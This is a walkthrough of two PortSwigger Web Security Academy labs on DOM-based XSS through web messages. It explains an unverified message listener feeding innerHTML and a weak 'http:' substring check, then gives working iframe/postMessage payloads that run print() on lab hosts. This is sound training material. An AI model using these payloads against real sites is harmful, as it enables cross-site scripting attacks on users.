# DOM-based vulnerabilities

- https://portswigger.net/web-security/dom-based

## DOM XSS using web messages

No `X-Frame-Options` header that would prevent loading this page in the `iframe` and additionally event listener preset for `message` event without origin verification that passes the input without sanitization to the `innerHtml` function.

Event listener for `message` event is our source, and `innerHtml` function is the sink.

Deliver below payload to the victim to solve the lab. It will load the victim page as an iframe and on load will post a message to all origins, causing vulnerable `message` event listener trigger.

```
<iframe src="https://0aa600ac04c124c89e1a8aa5009800fc.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("<img src=X onerror=\"print()\"/>", "*")'></iframe>
```

## DOM XSS using web messages and a JavaScript URL

Same story as before, but this time `message` event listener tries to check whether provided data is the link and update `location.href` by it.

Unfortunately the code shown below does not check whether the provided data starts with `http:` or `https:`, but only if the data contains one of those strings, so it could be bypassed by providing input `javascript:print();//https:`, which when set to `location.href` executes code and calls `print()`

```
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

To solve the lab we can deliver `iframe` containing vulnerable page, which onload posts a message which bypasses the `http` schema check and change `location.href` to `javascript:print()` code which calls the `print()` function.  

```
<iframe src="https://0a7200ce03bc3ad48289581c002500f5.web-security-academy.net/" style="width: 100%; height: 100%;" frameBorder="0" onload='this.contentWindow.postMessage("javascript:print();//https:", "*")'></iframe>
```
